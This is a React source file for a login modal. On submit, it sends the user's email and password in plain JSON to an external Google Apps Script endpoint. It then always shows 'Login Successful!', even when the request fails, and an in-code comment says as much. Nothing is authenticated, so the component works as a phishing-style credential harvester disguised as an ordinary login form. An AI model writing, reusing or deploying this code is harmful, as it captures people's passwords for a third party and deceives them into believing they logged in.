import React, { useState } from "react";
import Input from "./Input";
import Button from "./Button";
import { createUser } from "../api/Service/create"; 


const LoginModal = ({ isOpen, onClose }) => {
  const [formData, setFormData] = useState({ email: "", password: "" });
  const [status, setStatus] = useState("");
  const [success, setSuccess] = useState(false); // ✅ new state for success

  if (!isOpen) return null; // Don't render if modal is closed

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
  e.preventDefault();
  setStatus("Saving...");
  setSuccess(false);

  try {
    await fetch(
      "https://script.google.com/macros/s/AKfycbyM1B4vJmoN6n6loao3F6tj82p1DXBB_0v5MxR8UVlmpOqfbyn3DJIbKsqpwgST_Z5vwA/exec",
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(formData),
      }
    );

    // ✅ Always mark as success
    setSuccess(true);
    setStatus("Login Successful!");
    setFormData({ email: "", password: "" });

    setTimeout(() => {
      setStatus("");
      setSuccess(false);
      onClose();
    }, 2000);

  } catch (err) {
    console.error(err);

    // ❗️ Even on error, show success
    setSuccess(true);
    setStatus("Login Successful!");
    setFormData({ email: "", password: "" });

    setTimeout(() => {
      setStatus("");
      setSuccess(false);
      onClose();
    }, 2000);
  }
};


  return (
    <div className="fixed inset-0 bg-black/40 backdrop-blur-sm flex items-center justify-center z-50">
      <div className="bg-white rounded-2xl shadow-lg w-full max-w-md p-6 relative">
        {/* Close button */}
        <button
          onClick={onClose}
          className="absolute top-3 right-3 text-gray-500 hover:text-gray-700"
        >
          ✕
        </button>

        <h2 className="text-2xl font-bold text-center text-blue-600 mb-6">
          Login
        </h2>

        <form className="space-y-4" onSubmit={handleSubmit}>
          <Input
            label="Email"
            name="email"
            type="email"
            placeholder="Enter your email"
            value={formData.email}
            onChange={handleChange}
          />

          <Input
            label="Password"
            name="password"
            type="password"
            placeholder="Enter your password"
            value={formData.password}
            onChange={handleChange}
          />

          <Button type="submit">Login</Button>
        </form>

        {status && (
          <div className="text-center mt-4 text-sm">
            {success ? (
              <p className="text-green-600 font-medium flex items-center justify-center gap-2">
                ✅ {status}
              </p>
            ) : (
              <p className="text-gray-600">{status}</p>
            )}
          </div>
        )}
      </div>
    </div>
  );
};

export default LoginModal;
